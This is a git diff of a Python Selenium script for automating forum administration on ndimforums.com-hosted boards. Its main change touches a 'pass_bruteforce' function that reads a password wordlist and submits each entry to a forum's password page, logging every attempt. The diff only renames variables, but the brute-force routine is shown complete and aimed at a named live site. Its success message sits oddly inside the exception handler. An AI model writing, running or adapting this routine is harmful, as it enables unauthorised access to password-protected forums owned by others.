@@ -494,10 +494,6 @@ def edit_member_signature():
 	pass
 
 
-
-
-
-
 def navigate_edit_filters(forum):
 	navigate_in_admin_cp(forum, "Word Filters")
 
@@ -548,16 +544,16 @@ def add_filters(filter_dictionary: dict, forum: Forum, mode: int = 0):
 def overwrite_filters():
 	pass
 
-def pass_bruteforce(url,forumid,requestFile,driver):
-	passFile = "C:/Users/Max/Documents/backups/python/passwords/{}.txt".format(requestFile)
-	passList = open(passFile, "r")
+def pass_bruteforce(url,forumid,pass_file_name,driver):
+	pass_file = "{}.txt".format(pass_file_name)
+	pass_list = open(pass_file, "r")
 	driver.get("http://www.ndimforums.com/{}/forumpassword.asp?forumid={}".format(url, forumid))
-	for index, line in enumerate(passList):
+	for index, line in enumerate(pass_list):
 		try:
 			print('Attempted password ' + str(index) + ": " + line, flush=True)
-			passwordField = driver.find_element(By.XPATH,
+			pass_field = driver.find_element(By.XPATH,
 												"/html/body/div/form[3]/table/tbody/tr[2]/td/table/tbody/tr[2]/td[2]/input")
-			passwordField.send_keys(line)
+			pass_field.send_keys(line)
 		except:
 			print('Attempted password ' + str(index) + ": " + line, flush=True)
 			print("You're in!")
